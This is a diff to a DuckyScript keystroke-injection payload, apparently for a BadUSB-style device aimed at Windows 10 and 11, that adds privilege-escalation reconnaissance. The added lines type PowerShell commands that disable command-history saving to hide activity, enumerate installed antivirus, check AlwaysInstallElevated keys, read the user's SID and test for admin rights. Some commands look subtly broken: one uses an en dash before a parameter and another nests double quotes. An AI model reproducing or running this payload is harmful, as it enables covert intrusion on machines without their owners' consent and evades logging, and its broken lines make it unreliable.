@@ -8,13 +8,32 @@ REM     Target: Windows 10, 11
 
 REM   	Privilege escalation checks
 
-REM 	Check for installable file permissions
+REM 	Disable powershell logging
+
 DELAY 1000
 GUI r
+
+REM Disable powershell logging
+STRING powershell -c "Set-PSReadlineOption –HistorySaveStyle SaveNothing"
+ENTER
+DELAY 200
+REM 	List installed AV
+STRING powershell -c "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct"
+ENTER
+DELAY 200
+REM 	Check for installable file permissions
 STRING powershell -c "gp 'HKCU:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated"
 ENTER
 DELAY 100
 STRING powershell -c "gp 'HKLM:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated"
+ENTER
+DELAY 200
+REM 	Get SID of current user
+STRING powershell -c "([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value"
+ENTER
+DELAY 200	
+REM     Check for elevated privileges
+STRING powershell -c "If (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { echo "yes"; } else { echo "no"; }"
 ENTER
 DELAY 200
 REM 	Find unquoted service paths [TO-DO]
